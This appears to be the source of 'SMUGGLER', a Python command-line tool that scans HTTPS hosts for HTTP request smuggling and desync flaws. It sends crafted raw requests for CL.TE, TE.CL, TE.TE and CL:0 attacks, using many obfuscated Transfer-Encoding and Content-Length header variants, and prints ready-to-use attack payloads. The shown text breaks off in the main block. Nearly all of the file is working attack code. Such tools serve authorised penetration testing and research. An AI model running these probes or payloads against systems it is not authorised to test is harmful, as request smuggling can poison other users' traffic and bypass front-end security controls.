import requests
import argparse
import socket
import ssl
import time
import os
from tqdm import tqdm

def print_and_save_to_file(*args):
    global verbose
    date = time.strftime("%Y-%m-%d", time.localtime())
    
    # Vérifie si le dossier logs existe
    if not os.path.exists("logs"):
        os.mkdir("logs")

    # Construction du message brut (pour fichier)
    raw_text = ' '.join([remove_ansi(str(arg)) for arg in args])

    # Construction du message avec couleur (pour console)
    colored_text = ' '.join([str(arg) for arg in args])

    if verbose:
        print(colored_text)
        with open(f"logs/smuggler2000_{date}.log", "a") as f:
            f.write(raw_text + "\n")
    else:
        if args and isinstance(args[0], str) and ("[!]" in args[0] or "[>]" in args[0]):
            print(colored_text)
            with open(f"logs/smuggler2000_{date}.log", "a") as f:
                f.write(raw_text + "\n")

# Helper pour retirer les codes ANSI (pour les logs)
import re
def remove_ansi(text):
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

def extract_response(response):
    try:
        response = response.decode()
    except UnicodeDecodeError:
        response = response.decode("ISO-8859-1")

    return response.split("\r\n")[0]

def trace(host, user_agent):
    headers = {"User-Agent": f"{user_agent}", "X_test": "test"}
    r = requests.request("TRACE", f"https://{host}", headers=headers)
    r2 = requests.get(f"https://{host}", headers=headers)
    if r.status_code == 200 and r2.text != r.text and "X_test" in r.text:
        print_and_save_to_file(f"{RED}[!]{RESET} TRACE is enabled on the host {host}")
        print_and_save_to_file(f"{RED}[!]{RESET} TRACE response: \n"+r.text)
    else:
        print_and_save_to_file(f"{GREEN}[+]{RESET} TRACE is disabled on the host -", r.status_code)
    r3 = requests.request("FOO", f"https://{host}", headers=headers)
    if r3.text == r2.text:
        print_and_save_to_file(f"{GREEN}[+]{RESET} Be careful, the host treats unknown methods as GET")

def sanity_check(host):
    # check if host is UP
    global retries
    max_retries = 10
    while retries < max_retries:
        try:
            r = requests.get("https://" + host, timeout=1)
            if r.status_code in range(200, 299):
                print_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is up and behaving normally - {r.status_code}")
                return True
            elif r.status_code == 404:
                print_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is unreachable or not found - 404")
                return False
            else:
                print_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is weird")
                print_and_save_to_file(f"{GREEN}[+]{RESET} Status code: ", r.status_code)
                return False
        except requests.exceptions.ConnectionError:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is down")
            return False
        except requests.exceptions.ReadTimeout:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is slow or timing out")
            retries += 1
            return sanity_check(host)
    print_and_save_to_file(f"{GREEN}[+]{RESET} Sanity check: Host is down")
    retries = 0
    return False

def prepare_socket(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    wrapped_socket = context.wrap_socket(s, server_hostname=host)
    wrapped_socket.connect((host, 443))
    wrapped_socket.settimeout(1)
    return wrapped_socket

def lets_smuggle(host, request, show_request):
    wrapped_socket = prepare_socket(host)
    detect_step_1(wrapped_socket, request, host, show_request)
    wrapped_socket = prepare_socket(host)
    detect_step_2(wrapped_socket, request, host, show_request)
    wrapped_socket.close()

def detect_advanced_HTTPRS(host, show_request, user_agent):
    global method  
    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Testing CL.TE, TE.CL and TE.TE attack")

    # Basic detection
    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Basic detection of CL.TE and TE.CL")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header  - Transfer-Encoding[space]: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding : chunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header  - Transfer-Encoding: chunked[space]\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked \r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: xchunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: xchunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: \\tchunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: \tchunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - [space]Transfer-Encoding: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        " Transfer-Encoding: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - X: X\\nTransfer-Encoding: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "X: X\nTransfer-Encoding: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: chunked\\nX: X\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\nX: X\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: chunked\\nX: X\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\nX: X\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: chunked\\nX: X\\n\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\nX: X\n\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: \\nchunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: \nchunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding\\n: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding\n: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - transfer-encoding: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "transfer-encoding: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)
    
    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - TRANSFER-ENCODING: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "TRANSFER-ENCODING: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - TrAnSfEr-ENCodIng: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "TrAnSfEr-ENCodIng: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - tRanSfeR-encoDinG: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "tRanSfeR-encoDinG: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)
    
    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - TRANSFER-encoding: chunked\\r\\n")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "TRANSFER-encoding: chunked\r\n"
    )
    lets_smuggle(host, request, show_request)


    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with duplicated TE headers")
    request = (
        f"{method} / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: cooked\r\n"
    )
    lets_smuggle(host, request, show_request)

    
    
def detect_step_1(wrapped_socket, request, host, show_request):
    print_and_save_to_file(f"{GREEN}[+]{RESET} Detecting - Step 1")
    if not sanity_check(host):
        return
    request += (
        "\r\n"
        "3\r\n"
        "abc\r\n"
        "X\r\n"
    )
    if show_request:
        print_and_save_to_file("Request - Detection Step 1: \n"+ request)
    try:
        wrapped_socket.send(request.encode())
        response = wrapped_socket.recv(4096)
        response = extract_response(response)
        if "200" in response[:13]:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Host is using CL.CL")
        else:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Host is using TE.CL or TE.TE, or is not dumb")
            print_and_save_to_file(f"{GREEN}[+]{RESET} Probe response: "+ response)
    except TimeoutError:
        print_and_save_to_file(f"{GREEN}[+]{RESET} Host is using CL.TE")
        test_and_print_CLTE_exploit(host, request, show_request)
        return

def detect_step_2(wrapped_socket, request, host, show_request):
    print_and_save_to_file(f"{GREEN}[+]{RESET} Detecting - Step 2")
    if not sanity_check(host): 
        return
    request += (
        "\r\n"
        "0\r\n"
        "\r\n"
        "X"
    )
    if show_request:
        print_and_save_to_file("Request - Detection Step 2: \n"+ request)
    try:
        wrapped_socket.send(request.encode())
        response = wrapped_socket.recv(4096)
        response_2 = requests.get(f"https://{host}", timeout=1)
        response = extract_response(response)
        if "200" in response[:13] and response_2.status_code == 200:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Host is using CL.CL or TE.TE")
        if "200" in response[:13] and response_2.status_code != 200:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Host is vulnerable to CL.TE")
            test_and_print_CLTE_exploit(host, request, show_request)
        if "200" not in response[:13]:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Host is not dumb")
            print_and_save_to_file(f"{GREEN}[+]{RESET} Probe response: "+ response)
            return
    except TimeoutError: 
        print_and_save_to_file(f"{GREEN}[+]{RESET} Host is vulnerable to TE.CL")
        test_and_print_TECL_exploit(host, request, show_request)
    except requests.exceptions.ReadTimeout:
        print_and_save_to_file(f"{GREEN}[+]{RESET} Host is vulnerable to TE.CL")
        test_and_print_TECL_exploit(host, request, show_request)

def is_this_404(host, request, show_request):
    if show_request:
        print_and_save_to_file("Request - 404 test: \n"+ request)
    try:
        wrapped_socket = prepare_socket(host)
        wrapped_socket.send(request.encode())
        response = wrapped_socket.recv(4096)
        response_2 = requests.get(f"https://{host}", timeout=1)
        if response_2.status_code == 404:
            return True
        else:
            return False
        wrapped_socket.close()
    except requests.exceptions.ReadTimeout:
        return False
    except TimeoutError:
        return False

def test_and_print_TECL_exploit(host, request, show_request):
    global method
    if not sanity_check(host):
        return
    request = request.replace("Content-Length: 6", "Content-Length: 4")
    request = request.strip(
        "0\r\n"
        "\r\n"
        "X"
    )
    request += (
        "\r\n"
        "\r\n"
        "5e\r\n"
        f"{method} /404 HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    )
    if is_this_404(host, request, show_request):
        print_and_save_to_file(f"{RED}[!]{RESET} Host {host} is vulnerable to this TE.CL attack payload :")
        print_attack_with_n_r(request)
    else:
        print_and_save_to_file(f"{GREEN}[+]{RESET} Host is not vulnerable to TE.CL")

def test_and_print_CLTE_exploit(host, request, show_request):
    if not sanity_check(host):
        return
    request = request.strip(
        "0\r\n"    
        "\r\n"
        "X"
    )
    request = request.strip(
        "3\r\n"
        "abc\r\n"
        "X\r\n"
    )
    request = request.replace("Content-Length: 6", "Content-Length: 35")
    request += (
        "\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /404 HTTP/1.1\r\n"
        "X-Ignore: X"
    )
    if is_this_404(host, request, show_request):
        print_and_save_to_file(f"{RED}[!]{RESET} Host {host} is vulnerable to this CL.TE attack payload :")
        print_attack_with_n_r(request)
    else:
        print_and_save_to_file(f"{GREEN}[+]{RESET} Host is not vulnerable to CL.TE")

# CL0 client side desync
# good candidate are :
# post request to a static file
# post request to a server level redirect
# post request that triggers a server side error
# the backend ignores the body of the request and the content length header

def CL0_variations(host, endpoint, show_request, user_agent):
    global method
    print_and_save_to_file(f"\n{GREEN}[+]{RESET} Testing CL:0 attack via client side desync")
    body = (
        "GET /hope404 HTTP/1.1\r\n"
        "X-Ignore: X"
    )

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} basic CL:0 attack")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length[space]: N\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length : {len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with a duplicated CL header - Content-Length: N\\r\\nContent-Length: 0\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with a duplicated CL header - Content-Length: 0\\r\\nContent-Length: N\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        "Content-Length: 0\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length: \\tN\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: \t{len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - [space]Content-Length: N\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f" Content-Length: {len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - X: X\\nContent-Length: N\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"X: X\nContent-Length: {len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)
    
    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length: N\\nX: X\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {len(body)}\nX: X\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)
    
    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length\\n: N\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length\n: {len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

    print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an duplicated CL header - Content-Length: N\\r\\nContent-Length: N\\r\\n")
    attack_request = (
        f"{method} /"+endpoint+" HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n"
    )
    CL0_attack(host, endpoint, body, attack_request, show_request)

def CL0_attack(host, endpoint, body, attack_request, show_request): 
    if not sanity_check(host):
        return
    normal_request = (
        "GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    )
    #First we need to check if the front-end server is processing our CL header
    wrapped_socket = prepare_socket(host)
    wrapped_socket.sendall(attack_request.encode())
    attack_response = b""
    try:
        data = wrapped_socket.recv(4096)
        attack_response += data
        print_and_save_to_file(f"{GREEN}[+]{RESET} Host front-end is not processing this Content-Length header")
        return
    except TimeoutError:
        print_and_save_to_file(f"{GREEN}[+]{RESET} Host front-end is processing this Content-Length header")
    wrapped_socket.close()
    
    if not sanity_check(host):
        return
    
    # Attack request
    attack_request += body
    if show_request:
        print_and_save_to_file("Attack request: \n"+ attack_request)
    wrapped_socket = prepare_socket(host)
    wrapped_socket.sendall(attack_request.encode())
    attack_response = b""
    while True:
        try:
            data = wrapped_socket.recv(4096)
            attack_response += data
            if not data or data.endswith(b"\r\n\r\n"):
                break
        except TimeoutError:
            break
    wrapped_socket.sendall(normal_request.encode())
    normal_response = b""
    while True:
        try:
            data = wrapped_socket.recv(4096)
            normal_response += data
            if not data or data.endswith(b"\r\n\r\n"):
                break
        except TimeoutError:
            break
    wrapped_socket.close()
    # Check if the host is vulnerable
    attack_response = extract_response(attack_response)
    print_and_save_to_file(f"{GREEN}[+]{RESET} Attack response: " + attack_response)
    normal_response = extract_response(normal_response)
    if "404" in normal_response[:13]:
        print_and_save_to_file(f"{RED}[!]{RESET} {host} Endpoint {endpoint} is vulnerable to this CL:0 attack")
        print_attack_with_n_r(attack_request)
    else:
        print_and_save_to_file(f"{GREEN}[+]{RESET} Endpoint is not vulnerable to this CL:0 attack")
        if normal_response != "":
            print_and_save_to_file(f"{GREEN}[+]{RESET} Normal response: " + normal_response)
        else:
            print_and_save_to_file(f"{GREEN}[+]{RESET} Normal response: No response")

def clean_host_str(host):
    host = host.replace("https://", "").replace("http://", "")
    if host[-1:] == "/":
        host = host[:-1]
    return host

def host_or_endpoint(host):
    host = clean_host_str(host)
    if "/" in host:
        host, endpoint = host.split("/", 1)
        return host, endpoint
    else:
        return host, ""

def print_attack_with_n_r(attack):
    retries = 0 
    print_and_save_to_file(f"{RED}[!]{RESET} Here is the request:","\n"+repr(attack).replace("\\n", "\\n\n").strip("'"))

def print_banner():
    banner = r"""
  ██████  ███▄ ▄███▓ █    ██   ▄████   ▄████  ██▓    ▓█████  ██▀███  
▒██    ▒ ▓██▒▀█▀ ██▒ ██  ▓██▒ ██▒ ▀█▒ ██▒ ▀█▒▓██▒    ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██    ▓██░▓██  ▒██░▒██░▄▄▄░▒██░▄▄▄░▒██░    ▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██    ▒██ ▓▓█  ░██░░▓█  ██▓░▓█  ██▓▒██░    ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒   ░██▒▒▒█████▓ ░▒▓███▀▒░▒▓███▀▒░██████▒░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▒▓▒ ▒ ▒  ░▒   ▒  ░▒   ▒ ░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░  ░      ░░░▒░ ░ ░   ░   ░   ░   ░ ░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░      ░    ░░░ ░ ░ ░ ░   ░ ░ ░   ░   ░ ░      ░     ░░   ░ 
      ░         ░      ░           ░       ░     ░  ░   ░  ░   ░     
"""
    print(banner)

if __name__ == "__main__":
    BLUE = "\033[94m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    RESET = "\033[0m"
    print_banner()
    retries = 0
    parser = argparse.ArgumentParser(description="SMUGGLER - HTTP Request Smuggling tool\nAuthor: gobelinor")
    parser.add_argument("-host", help="Host to test", required=False)
    parser.add_argument("-list", help="List txt file of hosts to test", required=False)
    parser.add_argument("-show_request", help="Show requests", action="store_true")
    parser.add_argument("-user_agent", help="User-Agent to use", required=False)
    parser.add_argument("-method", help="HTTP method to use", required=False)
    parser.add_argument("-show_CLTE_payload", help="Print CL.TE attack payload", action="store_true")
    parser.add_argument("-show_TECL_payload", help="Print TE.CL attack payload", action="store_true")
    parser.add_argument("-show_TETE_payload", help="Print TE.TE attack payload", action="store_true")
    parser.add_argument("-show_CL0_payload", help="Print CL:0 attack payload", action="store_true")
    parser.add_argument("-verbose", help="Verbose mode", action="store_true")
    args = parser.parse_args()
    show_request = args.show_request
    if args.verbose:
        verbose = True
    else:
        verbose = False
    if args.method:
        method = args.method
    else:
        method = "POST"
    if args.user_agent:
        user_agent = args.user_agent
    else:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    if args.show_CLTE_payload or args.show_TECL_payload or args.show_TETE_payload or args.show_CL0_payload:
        if args.host:
            host = args.host
            host, endpoint = host_or_endpoint(host)
            if args.show_CLTE_payload:
                print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL.TE attack payload\n")
                attack = (
                    f"{method} / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 35\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                    "GET /404 HTTP/1.1\r\n"
                    "X-Ignore: X"
                )
                print_attack_with_n_r(attack)
                exit(1)
            if args.show_TECL_payload:
                print_and_save_to_file(f"\n{GREEN}[+]{RESET} TE.CL attack payload\n")
                attack = (
                    f"{method} / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 4\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "\r\n"
                    "5e\r\n"
                    f"{method} /404 HTTP/1.1\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 15\r\n"
                    "\r\n"
                    "x=1\r\n"
                    "0\r\n"
                    "\r\n"
                )
                print_attack_with_n_r(attack)
                exit(1)
            if args.show_TETE_payload:
                print_and_save_to_file(f"\n{GREEN}[+]{RESET} TE.TE attack payload - Turned into CL.TE\n")
                attack = (
                    f"{method} / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 35\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "Transfer-Encoding: chokbar\r\n"
                    "\r\n"
                    "0\r\n"
                    "\r\n"
                    "GET /404 HTTP/1.1\r\n"
                    "X-Ignore: X"
                )
                print_attack_with_n_r(attack)
                print_and_save_to_file(f"\n{GREEN}[+]{RESET} TE.TE attack payload - Turned into TE.CL\n")
                attack = (
                        f"{method} / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: 4\r\n"
                        "Transfer-Encoding: chunked\r\n"
                        "Transfer-Encoding: chokbar\r\n"
                        "\r\n"
                        "5e\r\n"
                        f"{method} /404 HTTP/1.1\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: 15\r\n"
                        "\r\n"
                        "x=1\r\n"
                        "0\r\n"
                        "\r\n"
                    )
                print_attack_with_n_r(attack)
                exit(1)
            if args.show_CL0_payload:
                print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack payload\n")
                body = (
                    "GET /hope404 HTTP/1.1\r\n"
                    "X-Ignore: X"
                )
                attack = (
                        f"{method} /"+endpoint+" HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Connection: keep-alive\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        "\r\n"
                    )
                print_attack_with_n_r(attack+body)
                exit(1)
        else:
            print_and_save_to_file(f"{RED}[+]{RESET} Please provide a host to generate the attack payload")
            exit(1)
    if args.host:
        host = args.host
        host, endpoint = host_or_endpoint(host)
        print_and_save_to_file(f"\n{GREEN}[>]{RESET} Testing host: ", f"{BLUE}{host}{RESET}")
        print_and_save_to_file(f"{GREEN}[>]{RESET} Testing method: ", f"{BLUE}{method}{RESET}")
        print_and_save_to_file(f"{GREEN}[>]{RESET} Testing endpoint: {BLUE}/{endpoint}{RESET}")
        try:
            if not sanity_check(host):
                exit(1)
            trace(host, user_agent)
            detect_advanced_HTTPRS(host, show_request, user_agent)
            CL0_variations(host, endpoint, show_request, user_agent)
        except KeyboardInterrupt:
